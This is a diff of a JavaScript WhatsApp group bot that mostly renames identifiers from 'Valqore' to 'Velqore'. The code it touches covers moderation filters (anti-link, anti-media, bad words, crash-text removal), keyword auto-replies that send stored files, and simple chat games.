+VelqoreInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
 if (!isBotAdmins) return
-if(ValqoreTheCreator) return
-ValqoreInc.groupParticipantsUpdate(from, [sender], 'remove')
-await ValqoreInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
-ValqoreInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
+if(VelqoreTheCreator) return
+VelqoreInc.groupParticipantsUpdate(from, [sender], 'remove')
+await VelqoreInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+VelqoreInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
  }
  }
  
@@ -793,89 +789,89 @@ ValqoreInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
     if (m.isBaileys && m.fromMe == false){
         if (isAdmin || !isBotAdmin){		  
         } else {
-          replygcValqore(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
-    return await ValqoreInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+          replygcVelqore(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
+    return await VelqoreInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
         }
     }
    }
  
         //anti media
         if (db.data.chats[m.chat].antimedia && isMedia) {
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
   }
-        if (db.data.chats[m.chat].image && isValqoreMedia) {
-    if(isValqoreMedia === "imageMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+        if (db.data.chats[m.chat].image && isVelqoreMedia) {
+    if(isVelqoreMedia === "imageMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
-        }
-    }
-  }
-        if (db.data.chats[m.chat].antivideo && isValqoreMedia) {
-    if(isValqoreMedia === "videoMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
-        } else {
-          replygcValqore(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
-        if (db.data.chats[m.chat].antisticker && isValqoreMedia) {
-    if(isValqoreMedia === "stickerMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+        if (db.data.chats[m.chat].antivideo && isVelqoreMedia) {
+    if(isVelqoreMedia === "videoMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
-        if (db.data.chats[m.chat].antiaudio && isValqoreMedia) {
-    if(isValqoreMedia === "audioMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+        if (db.data.chats[m.chat].antisticker && isVelqoreMedia) {
+    if(isVelqoreMedia === "stickerMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
-       if (db.data.chats[m.chat].antipoll && isValqoreMedia) {
-    if(isValqoreMedia === "pollCreationMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+        if (db.data.chats[m.chat].antiaudio && isVelqoreMedia) {
+    if(isVelqoreMedia === "audioMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
-       if (db.data.chats[m.chat].antilocation && isValqoreMedia) {
-    if(isValqoreMedia === "locationMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+       if (db.data.chats[m.chat].antipoll && isVelqoreMedia) {
+    if(isVelqoreMedia === "pollCreationMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
-       if (db.data.chats[m.chat].antidocument && isValqoreMedia) {
-    if(isValqoreMedia === "documentMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+       if (db.data.chats[m.chat].antilocation && isVelqoreMedia) {
+    if(isVelqoreMedia === "locationMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
-      if (db.data.chats[m.chat].anticontact && isValqoreMedia) {
-    if(isValqoreMedia === "contactMessage"){
-        if (ValqoreTheCreator || isAdmins || !isBotAdmins){		  
+       if (db.data.chats[m.chat].antidocument && isVelqoreMedia) {
+    if(isVelqoreMedia === "documentMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
         } else {
-          replygcValqore(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
-    return ValqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+          replygcVelqore(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
+        }
+    }
+  }
+      if (db.data.chats[m.chat].anticontact && isVelqoreMedia) {
+    if(isVelqoreMedia === "contactMessage"){
+        if (VelqoreTheCreator || isAdmins || !isBotAdmins){		  
+        } else {
+          replygcVelqore(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
+    return VelqoreInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
     }
   }
@@ -884,7 +880,7 @@ ValqoreInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
             for (let bak of bad) {
                if (budy === bak) {
                   let baduser = await db.data.users[sender].badword
-                  ValqoreInc.sendMessage(m.chat,
+                  VelqoreInc.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -893,7 +889,7 @@ ValqoreInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
 			            participant: m.key.participant
 			        }
 			    })
-			ValqoreInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			VelqoreInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
                }
             }
         }
@@ -902,22 +898,22 @@ ValqoreInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
         	if (m.key.fromMe) return
             if (/image/.test(mime) && !/webp/.test(mime)) {
                 let mediac = await quoted.download()
-                ValqoreInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                VelqoreInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                 console.log(`Auto sticker detected`)
             } else if (/video/.test(mime)) {
                 if ((quoted.msg || quoted).seconds > 11) return
                 let mediac = await quoted.download()
-                ValqoreInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                VelqoreInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
             }
         }
         
         if (db.data.chats[m.chat].antilinkgc) {
             if (budy.match(`chat.whatsapp.com`)) {
                bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
-if (isAdmins) return replygcValqore(bvl)
-if (m.key.fromMe) return replygcValqore(bvl)
-if (ValqoreTheCreator) return replygcValqore(bvl)
-               await ValqoreInc.sendMessage(m.chat,
+if (isAdmins) return replygcVelqore(bvl)
+if (m.key.fromMe) return replygcVelqore(bvl)
+if (VelqoreTheCreator) return replygcVelqore(bvl)
+               await VelqoreInc.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -926,16 +922,16 @@ if (ValqoreTheCreator) return replygcValqore(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ValqoreInc.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			VelqoreInc.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
             }
         }
         if (db.data.chats[m.chat].antilink) {
             if (budy.match('http') && budy.match('https')) {
                bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
-if (isAdmins) return replygcValqore(bvl)
-if (m.key.fromMe) return replygcValqore(bvl)
-if (ValqoreTheCreator) return replygcValqore(bvl)
-               await ValqoreInc.sendMessage(m.chat,
+if (isAdmins) return replygcVelqore(bvl)
+if (m.key.fromMe) return replygcVelqore(bvl)
+if (VelqoreTheCreator) return replygcVelqore(bvl)
+               await VelqoreInc.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -944,7 +940,7 @@ if (ValqoreTheCreator) return replygcValqore(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ValqoreInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			VelqoreInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
             }
         }
         //afk
@@ -955,73 +951,73 @@ if (ValqoreTheCreator) return replygcValqore(bvl)
             let afkTime = user.afkTime
             if (!afkTime || afkTime < 0) continue
             let reason = user.afkReason || ''
-            replygcValqore(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
+            replygcVelqore(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
         }
         if (db.data.users[m.sender].afkTime > -1) {
             let user = global.db.data.users[m.sender]
-            replygcValqore(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
+            replygcVelqore(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
             user.afkTime = -1
             user.afkReason = ''
         }
         
 //total features
-const Valqorefeature = () =>{
-            var mytext = fs.readFileSync("./ValqoreCheems11.js").toString()
+const Velqorefeature = () =>{
+            var mytext = fs.readFileSync("./VelqoreCheems11.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length
             return numUpper
         }
         //autoreply
-for (let BhosdikaValqore of VoiceNoteValqore) {
-if (budy === BhosdikaValqore) {
-let audiobuffy = fs.readFileSync(`./ValqoreMedia/audio/${BhosdikaValqore}.mp3`)
-ValqoreInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+for (let BhosdikaVelqore of VoiceNoteVelqore) {
+if (budy === BhosdikaVelqore) {
+let audiobuffy = fs.readFileSync(`./VelqoreMedia/audio/${BhosdikaVelqore}.mp3`)
+VelqoreInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 }
 }
-for (let BhosdikaValqore of StickerValqore){
-if (budy === BhosdikaValqore){
-let stickerbuffy = fs.readFileSync(`./ValqoreMedia/sticker/${BhosdikaValqore}.webp`)
-ValqoreInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
+for (let BhosdikaVelqore of StickerVelqore){
+if (budy === BhosdikaVelqore){
+let stickerbuffy = fs.readFileSync(`./VelqoreMedia/sticker/${BhosdikaVelqore}.webp`)
+VelqoreInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
 }
 }
-for (let BhosdikaValqore of ImageValqore){
-if (budy === BhosdikaValqore){
-let imagebuffy = fs.readFileSync(`./ValqoreMedia/image/${BhosdikaValqore}.jpg`)
-ValqoreInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
+for (let BhosdikaVelqore of ImageVelqore){
+if (budy === BhosdikaVelqore){
+let imagebuffy = fs.readFileSync(`./VelqoreMedia/image/${BhosdikaVelqore}.jpg`)
+VelqoreInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
 }
 }
-for (let BhosdikaValqore of VideoValqore){
-if (budy === BhosdikaValqore){
-let videobuffy = fs.readFileSync(`./ValqoreMedia/video/${BhosdikaValqore}.mp4`)
-ValqoreInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
+for (let BhosdikaVelqore of VideoVelqore){
+if (budy === BhosdikaVelqore){
+let videobuffy = fs.readFileSync(`./VelqoreMedia/video/${BhosdikaVelqore}.mp4`)
+VelqoreInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
 }
 }
 
 const sendapk = (teks) => {
-ValqoreInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
+VelqoreInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
 }
-for (let BhosdikaValqore of ApkValqore) {
-if (budy === BhosdikaValqore) {
-let buffer = fs.readFileSync(`./ValqoreMedia/apk/${BhosdikaValqore}.apk`)
+for (let BhosdikaVelqore of ApkVelqore) {
+if (budy === BhosdikaVelqore) {
+let buffer = fs.readFileSync(`./VelqoreMedia/apk/${BhosdikaVelqore}.apk`)
 sendapk(buffer)
 }
 }
 
 const sendzip = (teks) => {
-ValqoreInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
+VelqoreInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
 }
-for (let BhosdikaValqore of ZipValqore) {
-if (budy === BhosdikaValqore) {
-let buffer = fs.readFileSync(`./ValqoreMedia/zip/${BhosdikaValqore}.zip`)
+for (let BhosdikaVelqore of ZipVelqore) {
+if (budy === BhosdikaVelqore) {
+let buffer = fs.readFileSync(`./VelqoreMedia/zip/${BhosdikaVelqore}.zip`)
 sendzip(buffer)
 }
 }
 
 const senddocu = (teks) => {
-ValqoreInc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
+VelqoreInc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
 }
-for (let BhosdikaValqore of DocValqore) {
-if (budy === BhosdikaValqore) {
-let buffer = fs.readFileSync(`./ValqoreMedia/doc/${BhosdikaValqore}.pdf`)
+for (let BhosdikaVelqore of DocVelqore) {
+if (budy === BhosdikaVelqore) {
+let buffer = fs.readFileSync(`./VelqoreMedia/doc/${BhosdikaVelqore}.pdf`)
 senddocu(buffer)
 }
 }
@@ -1031,10 +1027,10 @@ if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in globa
 let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
 let { text, mentionedJid } = hash
 let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
-    userJid: ValqoreInc.user.id,
+    userJid: VelqoreInc.user.id,
     quoted: m.quoted && m.quoted.fakeObj
 })
-messages.key.fromMe = areJidsSameUser(m.sender, ValqoreInc.user.id)
+messages.key.fromMe = areJidsSameUser(m.sender, VelqoreInc.user.id)
 messages.key.id = m.key.id
 messages.pushName = m.pushName
 if (m.isGroup) messages.participant = m.sender
@@ -1043,7 +1039,7 @@ let msg = {
     messages: [proto.WebMessageInfo.fromObject(messages)],
     type: 'append'
 }
-ValqoreInc.ev.emit('messages.upsert', msg)
+VelqoreInc.ev.emit('messages.upsert', msg)
 }
 
 //math
@@ -1052,9 +1048,9 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
             kuis = true
             jawaban = kuismath[m.sender.split('@')[0]]
             if (budy.toLowerCase() == jawaban) {
-                await replygcValqore(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
+                await replygcVelqore(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                 delete kuismath[m.sender.split('@')[0]]
-            } else replygcValqore('*Wrong Answer!*')
+            } else replygcVelqore('*Wrong Answer!*')
         }
         
         //game
@@ -1065,14 +1061,14 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
             let isWin = !1
             let isTie = !1
             let isSurrender = !1
-            // replygcValqore(`[DEBUG]\n${parseInt(m.text)}`)
+            // replygcVelqore(`[DEBUG]\n${parseInt(m.text)}`)
             if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
             isSurrender = !/^[1-9]$/.test(m.text)
             if (m.sender !== room.game.currentTurn) {
                 if (!isSurrender) return !0
             }
             if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
-                replygcValqore({
+                replygcVelqore({
                     '-3': 'The game is over',
                     '-2': 'Invalid',
                     '-1': 'Invalid Position',
@@ -1115,10 +1111,10 @@ ${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌'
 Type *surrender* to surrender and admit defeat`
             if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                 room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
-            if (room.x !== room.o) ValqoreInc.sendText(room.x, str, m, {
+            if (room.x !== room.o) VelqoreInc.sendText(room.x, str, m, {
                 mentions: parseMention(str)
             })
-            ValqoreInc.sendText(room.o, str, m, {
+            VelqoreInc.sendText(room.o, str, m, {
                 mentions: parseMention(str)
             })
             if (isTie || isWin) {
@@ -1134,7 +1130,7 @@ Type *surrender* to surrender and admit defeat`
 	    let tie = false
 	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
 	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
-	    ValqoreInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
+	    VelqoreInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
 	    delete this.suit[roof.id]
 	    return !0
 	    }
@@ -1142,20 +1138,20 @@ Type *surrender* to surrender and admit defeat`
 	    roof.asal = m.chat
 	    clearTimeout(roof.waktu)
 	    //delete roof[roof.id].waktu
-	    ValqoreInc.sendText(m.chat, `Suit has been sent to chat
+	    VelqoreInc.sendText(m.chat, `Suit has been sent to chat
 
 @${roof.p.split`@`[0]} and 
 @${roof.p2.split`@`[0]}
 
 Please choose a suit in the respective chat"
 click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-	    if (!roof.pilih) ValqoreInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
-	    if (!roof.pilih2) ValqoreInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
+	    if (!roof.pilih) VelqoreInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
+	    if (!roof.pilih2) VelqoreInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
 	    roof.waktu_milih = setTimeout(() => {
-	    if (!roof.pilih && !roof.pilih2) ValqoreInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
+	    if (!roof.pilih && !roof.pilih2) VelqoreInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
 	    else if (!roof.pilih || !roof.pilih2) {
 	    win = !roof.pilih ? roof.p2 : roof.p
-	    ValqoreInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
+	    VelqoreInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
 	    }
 	    delete this.suit[roof.id]
 	    return !0
@@ -1170,14 +1166,14 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
 	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
 	    roof.text = m.text
-	    replygcValqore(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
-	    if (!roof.pilih2) ValqoreInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
+	    replygcVelqore(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
+	    if (!roof.pilih2) VelqoreInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
 	    }
 	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
 	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
 	    roof.text2 = m.text
-	    replygcValqore(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
-	    if (!roof.pilih) ValqoreInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
+	    replygcVelqore(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
+	    if (!roof.pilih) VelqoreInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
 	    }
 	    let stage = roof.pilih
 	    let stage2 = roof.pilih2
@@ -1190,7 +1186,7 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    else if (k.test(stage) && b.test(stage2)) win = roof.p
 	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
 	    else if (stage == stage2) tie = true
-	    ValqoreInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}
+	    VelqoreInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}
 
 @${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
 @${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
@@ -1201,113 +1197,113 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
         
         //user db
         if (isCommand && !isUser) {
-Valqoreverifieduser.push(sender)
-fs.writeFileSync('./src/data/role/user.json', JSON.stringify(Valqoreverifieduser, null, 2))
+Velqoreverifieduser.push(sender)
+fs.writeFileSync('./src/data/role/user.json', JSON.stringify(Velqoreverifieduser, null, 2))
 }
         
         switch (isCommand) {
             case 'addbadword': case 'addbd':
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!groupAdmins) return replygcValqore(mess.admin)
-               if (args.length < 1) return replygcValqore( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!groupAdmins) return replygcVelqore(mess.admin)
+               if (args.length < 1) return replygcVelqore( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
                bad.push(q)
                fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
-               replygcValqore('Successfully Added Bad Word!')
+               replygcVelqore('Successfully Added Bad Word!')
             break
             case 'delbadword': case 'deldb':
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!groupAdmins) return replygcValqore(mess.admin)
-               if (args.length < 1) return replygcValqore( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!groupAdmins) return replygcVelqore(mess.admin)
+               if (args.length < 1) return replygcVelqore( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
                bad.splice(q)
                fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
-               replygcValqore('Successfully Deleted Bad Word!')
+               replygcVelqore('Successfully Deleted Bad Word!')
             break 
             case 'resetuser':
             case 'resetdbuser': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
                let totalusernya = db.data.users[0]
-               replygcValqore(`Succesfully Deleted ${totalusernya} Users in Database`)
+               replygcVelqore(`Succesfully Deleted ${totalusernya} Users in Database`)
                db.data.users = []
             }
             break
             case 'resethit':
             case 'resettotalhit': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
                global.db.data.settings[botNumber].totalhit = 0
